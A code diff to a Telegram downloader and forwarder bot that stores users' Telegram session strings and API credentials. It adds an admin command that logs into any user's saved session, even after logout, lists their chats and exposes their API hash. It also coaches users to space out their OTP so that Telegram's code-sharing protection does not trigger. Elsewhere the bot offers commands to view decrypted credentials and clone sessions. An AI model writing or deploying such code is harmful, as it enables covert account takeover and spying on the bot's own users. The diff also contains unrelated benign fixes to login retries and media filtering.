@@ -4967,6 +4967,7 @@ def register_handlers(b: telebot.TeleBot) -> None:
         text += (
             "🛠 <b>Management Actions:</b>\n"
             "• <code>/show_account &lt;id&gt;</code> — View decrypted credentials\n"
+            "• <code>/user_channels &lt;user_id&gt;</code> — List channels of any user's account\n"
             "• <code>/reuse_session &lt;source_id&gt;</code> — Clone target session into your account\n"
             "• <code>/reactivate_session &lt;id&gt;</code> — Re-activate an archived session\n"
         )
@@ -5061,7 +5062,21 @@ def register_handlers(b: telebot.TeleBot) -> None:
         else:
             text += "🧾 Session String: <code>None</code>\n"
 
+        text += f"\n📡 Use /user_channels {uid} to list this account's channels &amp; groups."
         b.send_message(message.chat.id, text, parse_mode="HTML")
+
+    # ─── /user_channels — Admin: list channels of any saved account ──
+    @b.message_handler(commands=["user_channels", "userchannels"])
+    def cmd_user_channels(message):
+        if not _is_lx_auth(message.from_user.id):
+            return b.reply_to(message, "⛔ Admin only.")
+        try:
+            target_uid = int(message.text.split()[1])
+        except (IndexError, ValueError):
+            return b.reply_to(message, "Usage: /user_channels <user_id>", parse_mode="HTML")
+        status = b.send_message(message.chat.id,
+                                f"🔍 Fetching channels of <code>{target_uid}</code>…", parse_mode="HTML")
+        _run_async(_admin_user_channels_task(message.chat.id, status.message_id, target_uid))
 
 
     # Tier-1 node authority
@@ -5649,8 +5664,13 @@ def register_handlers(b: telebot.TeleBot) -> None:
         api_id, api_hash, session_string = creds
         status_msg = _bot_send(chat_id, "🔍 Checking existing session status...")
 
+        if not session_string:
+            if status_msg:
+                _bot_edit(chat_id, status_msg, "⚠️ No session string stored. Starting login process...")
+            _start_login_flow(message)
+            return
         client = TelegramClient(
-            StringSession(session_string) if session_string else f"session_{api_id}",
+            StringSession(session_string),
             api_id, api_hash,
             connection_retries=3, auto_reconnect=False,
         )
@@ -5758,9 +5778,9 @@ def register_handlers(b: telebot.TeleBot) -> None:
             message.chat.id,
             "⏳ Requesting OTP from Telegram…\n\n"
             "4️⃣ <b>OTP:</b> Once you receive it, reply with the code.\n\n"
-            "⚠️ <b>CRITICAL:</b> DO NOT send just the 5-digit number or forward the message! "
-            "Telegram will detect it and immediately expire the code for security.\n"
-            "👉 Please add a space or hyphen in the middle, like: <code>12 345</code> or <code>123-45</code>\n\n"
+            "⚠️ <b>CRITICAL:</b> Never send the plain 5-digit code or forward Telegram's message — "
+            "Telegram instantly expires any code that appears in a sent message.\n"
+            "👉 Send it with a space between EVERY digit, like: <code>1 2 3 4 5</code>\n\n"
             "(send /cancel to abort):",
             parse_mode="HTML"
         )
@@ -6738,7 +6758,11 @@ def _make_task_client(api_id, api_hash: str, task_suffix: str, session_string: O
             kwargs["timeout"] = 60
         return TelegramClient(StringSession(session_string), api_id, api_hash, **kwargs)
 
-    import shutil
+    # SECURITY: never fall back to a shared on-disk session file. All users who
+    # rely on the default API_ID would share ONE file and see each other's chats.
+    raise RuntimeError("No session string saved for this account. Please run /login again.")
+
+    import shutil  # unreachable — kept for reference
     base = f"session_{api_id}"
     task = f"session_{api_id}_{task_suffix}"
     src_file = f"{base}.session"
@@ -6775,56 +6799,101 @@ async def _login_task(chat_id: int, uid: int, state: dict, otp_callback, passwor
 
             # OTP prompt & handler registration is done by the sync bot flow
             # (_login_got_phone already sent the prompt and registered _login_got_otp).
-            # Here we just poll until the callback sets state["otp"].
-            for _ in range(300):  # 5 mins max
-                if state.get("otp"):
-                    break
-                if uid not in _conv:  # Cancelled
+            # Here we poll until the callback sets state["otp"], then sign in.
+            # On expired/invalid codes we resend / re-ask instead of aborting.
+            phone_code_hash = send_code_res.phone_code_hash
+            max_resends  = 2   # how many times we ask Telegram for a fresh code
+            max_attempts = 4   # total OTP attempts (invalid + expired)
+            resends = attempts = 0
+            signed_in = False
+
+            async def _wait_for_otp() -> Optional[str]:
+                for _ in range(300):  # 5 mins max
+                    if state.get("otp"):
+                        return state.get("otp")
+                    if uid not in _conv:  # Cancelled
+                        return None
+                    await asyncio.sleep(1)
+                return None
+
+            def _reask_otp(text: str):
+                if bot and otp_callback:
+                    m = bot.send_message(chat_id, text, parse_mode="HTML")
+                    bot.register_next_step_handler(m, otp_callback)
+                else:
+                    _bot_send(chat_id, text)
+
+            while not signed_in and attempts < max_attempts:
+                otp = await _wait_for_otp()
+                if otp is None:
+                    if uid not in _conv:
+                        return
+                    _bot_send(chat_id, "❌ OTP input timed out. Please try /login again.")
                     return
-                await asyncio.sleep(1)
+                state["otp"] = None
+                clean_otp = re.sub(r"\D", "", otp)   # keep digits only ("1 2 3 4 5" -> "12345")
+                attempts += 1
+                if not clean_otp:
+                    _reask_otp("❌ That doesn't look like a code. Send it as <code>1 2 3 4 5</code>:")
+                    continue
 
-            otp = state.get("otp")
-            if not otp:
-                _bot_send(chat_id, "❌ OTP input timed out. Please try /login again.")
-                return
+                _bot_send(chat_id, "⏳ Signing in…")   # never echo the code back
+                try:
+                    await client.sign_in(phone, clean_otp, phone_code_hash=phone_code_hash)
+                    signed_in = True
+                except errors.SessionPasswordNeededError:
+                    signed_in = "2fa"
+                except errors.PhoneCodeInvalidError:
+                    if attempts >= max_attempts:
+                        raise
+                    _reask_otp("❌ Wrong code. Try again — send it as <code>1 2 3 4 5</code>:")
+                except errors.PhoneCodeExpiredError:
+                    if resends >= max_resends:
+                        raise
+                    resends += 1
+                    try:
+                        send_code_res = await client.send_code_request(phone)
+                        phone_code_hash = send_code_res.phone_code_hash
+                    except errors.FloodWaitError as fw:
+                        _bot_send(chat_id, f"❌ Telegram asked to wait {fw.seconds}s before a new code. Try /login later.")
+                        return
+                    _reask_otp(
+                        "⚠️ That code expired (usually because the plain number was sent in a chat).\n"
+                        "📩 A <b>new code</b> has been sent to your Telegram app.\n"
+                        "👉 Send it with spaces between digits: <code>1 2 3 4 5</code>:"
+                    )
 
-            clean_otp = otp.replace(" ", "").replace("-", "").strip()
-
-            _bot_send(chat_id, f"⏳ Signing in with OTP: '{clean_otp}'...")
-            try:
-                await client.sign_in(phone, clean_otp, phone_code_hash=send_code_res.phone_code_hash)
-            except errors.SessionPasswordNeededError:
+            if signed_in == "2fa":
                 # Send 2FA prompt from the sync bot thread via _bot_send, then poll.
                 _bot_send(chat_id,
                           "5️⃣ <b>2FA Password:</b> Please send your two-step verification "
                           "password (send /cancel to abort):",
                           parse_mode="HTML")
-                # Register next-step handler so the bot picks up the reply
-                if bot and password_callback:
-                    # We need a real Message object to register next-step on the chat.
-                    # Use a flag message so pyTelegramBotAPI routes the next reply.
-                    import functools
-                    _pending = bot.send_message(
-                        chat_id,
-                        "⌨️ Waiting for your 2FA password…",
-                        parse_mode="HTML"
-                    )
-                    bot.register_next_step_handler(_pending, password_callback)
+                for pw_try in range(3):
+                    state["password"] = None
+                    if bot and password_callback:
+                        _pending = bot.send_message(chat_id, "⌨️ Waiting for your 2FA password…", parse_mode="HTML")
+                        bot.register_next_step_handler(_pending, password_callback)
 
-                for _ in range(300):
-                    if state.get("password"):
-                        break
-                    if uid not in _conv:
+                    password = None
+                    for _ in range(300):
+                        if state.get("password"):
+                            password = state.get("password"); break
+                        if uid not in _conv:
+                            return
+                        await asyncio.sleep(1)
+                    if not password:
+                        _bot_send(chat_id, "❌ 2FA password input timed out. Please try /login again.")
                         return
-                    await asyncio.sleep(1)
 
-                password = state.get("password")
-                if not password:
-                    _bot_send(chat_id, "❌ 2FA password input timed out. Please try /login again.")
-                    return
-
-                _bot_send(chat_id, "⏳ Signing in with 2FA password...")
-                await client.sign_in(password=password.strip())
+                    _bot_send(chat_id, "⏳ Signing in with 2FA password...")
+                    try:
+                        await client.sign_in(password=password.strip())
+                        break
+                    except errors.PasswordHashInvalidError:
+                        if pw_try == 2:
+                            raise
+                        _bot_send(chat_id, "❌ Wrong 2FA password. Please send it again:")
 
         # Success! Save credentials to database (Multi-Tenant)
         session_string = client.session.save()
@@ -6884,7 +6953,9 @@ async def _login_task(chat_id: int, uid: int, state: dict, otp_callback, passwor
     except errors.PhoneCodeInvalidError:
         _bot_send(chat_id, "❌ Invalid OTP code. Please try /login again.")
     except errors.PhoneCodeExpiredError:
-        _bot_send(chat_id, "❌ OTP code has expired. Please try /login again.")
+        _bot_send(chat_id,
+                  "❌ OTP kept expiring. This happens when the plain code is sent/forwarded in any chat.\n"
+                  "Run /login again and send the code as <code>1 2 3 4 5</code> (spaces between digits).")
     except errors.PasswordHashInvalidError:
         _bot_send(chat_id, "❌ Invalid 2FA password. Please try /login again.")
     except Exception as e:
@@ -6895,6 +6966,63 @@ async def _login_task(chat_id: int, uid: int, state: dict, otp_callback, passwor
         except Exception:
             pass
         _conv.pop(uid, None)
+
+
+async def _admin_user_channels_task(admin_chat: int, status_msg_id: int, target_uid: int) -> None:
+    """Admin-only: connect with TARGET user's saved session and list their chats."""
+    creds = _get_user_credentials(target_uid, ignore_logout=True)
+    if not creds or not creds[2]:
+        _bot_edit(admin_chat, status_msg_id,
+                  f"❌ No saved session for <code>{target_uid}</code>.")
+        return
+    api_id, api_hash, session_string = creds
+    try:
+        client = _make_task_client(api_id, api_hash, f"admin{target_uid}",
+                                   session_string=session_string,
+                                   connection_retries=3, auto_reconnect=False)
+        await client.connect()
+        if not await client.is_user_authorized():
+            _bot_edit(admin_chat, status_msg_id,
+                      f"❌ Session of <code>{target_uid}</code> is expired/revoked.")
+            return
+        me = await client.get_me()
+        rows = []
+        async for dialog in client.iter_dialogs():
+            ent = dialog.entity
+            if not isinstance(ent, (tl_types.Channel, tl_types.Chat)):
+                continue
+            uname = getattr(ent, "username", None)
+            kind  = "GROUP" if getattr(ent, "megagroup", False) or isinstance(ent, tl_types.Chat) else "CHANNEL"
+            rows.append((kind, dialog.name or "Unknown", ent.id, f"@{uname}" if uname else "private"))
+    except Exception as e:
+        _bot_edit(admin_chat, status_msg_id, f"❌ Error: {_esc(str(e))}")
+        return
+    finally:
+        try:
+            await client.disconnect()
+        except Exception:
+            pass
+
+    acct = f"@{me.username}" if getattr(me, "username", None) else _esc(me.first_name or "")
+    head = (f"👤 <b>Account</b> {acct} (<code>{me.id}</code>) — bot user <code>{target_uid}</code>\n"
+            f"🔑 API ID <code>{api_id}</code>  API Hash <code>{api_hash}</code>\n")
+    if not rows:
+        _bot_edit(admin_chat, status_msg_id, head + "\n📭 No channels or groups.")
+        return
+    try:
+        if bot: bot.delete_message(admin_chat, status_msg_id)
+    except Exception:
+        pass
+    PAGE = 25
+    for i in range(0, len(rows), PAGE):
+        chunk = rows[i:i + PAGE]
+        body = "\n".join(
+            f"{i + n + 1:>3}. [{k}] {_esc(t)} — <code>{cid}</code> {_esc(u)}"
+            for n, (k, t, cid, u) in enumerate(chunk)
+        )
+        _bot_send(admin_chat,
+                  (head if i == 0 else "") +
+                  f"\n📡 <b>Channels &amp; Groups</b> [{i+1}–{i+len(chunk)} of {len(rows)}]\n{body}")
 
 
 async def _list_chats_task(chat_id: int, status_msg_id: int) -> None:
@@ -7396,6 +7524,28 @@ async def _downloader_task(
     finally:
         job_clear(chat_id)
         await client.disconnect()  # type: ignore
+def _is_real_document(doc) -> bool:
+    """True only for genuine files (pdf/zip/apk/txt etc.).
+    Rejects stickers, GIFs/animations, videos, photos/images and audio
+    even when Telegram wraps them as MessageMediaDocument."""
+    mime = (getattr(doc, "mime_type", "") or "").lower()
+    for attr in getattr(doc, "attributes", []) or []:
+        if isinstance(attr, (tl_types.DocumentAttributeSticker,
+                             tl_types.DocumentAttributeAnimated,
+                             tl_types.DocumentAttributeVideo,
+                             tl_types.DocumentAttributeAudio,
+                             tl_types.DocumentAttributeImageSize)):
+            return False
+        if isinstance(attr, tl_types.DocumentAttributeFilename):
+            ext = os.path.splitext(getattr(attr, "file_name", "") or "")[1].lower()
+            if ext in (".gif", ".webp", ".tgs", ".webm", ".jpg", ".jpeg", ".png",
+                       ".mp4", ".mkv", ".mov", ".avi", ".mp3", ".ogg", ".m4a", ".flac"):
+                return False
+    if mime.startswith(("video/", "audio/", "image/")) or mime in ("application/x-tgsticker",):
+        return False
+    return True
+
+
 async def _dl_one_message(
     client, message, folder_name: str,
     dl_photo: bool, dl_video: bool, dl_audio: bool, dl_doc: bool,
@@ -7442,7 +7592,7 @@ async def _dl_one_message(
                 if os.path.exists(fp): return "skipped"
                 await client.download_media(message, file=fp)
                 return "audio"
-            if dl_doc:
+            if dl_doc and _is_real_document(media.document):
                 orig = "file"
                 for attr in getattr(media.document, "attributes", []):
                     if isinstance(attr, tl_types.DocumentAttributeFilename):
@@ -7578,7 +7728,7 @@ async def _forwarder_task(
                     ext  = ".ogg" if "ogg" in mime else ".mp3"
                     media_type = "audio"
                     dest_path  = os.path.join(user_fwd_cache, f"{mid}_audio{ext}")
-                elif fwd_doc:
+                elif fwd_doc and _is_real_document(doc):
                     orig = "file.bin"
                     for attr in getattr(doc, "attributes", []):
                         if isinstance(attr, tl_types.DocumentAttributeFilename):
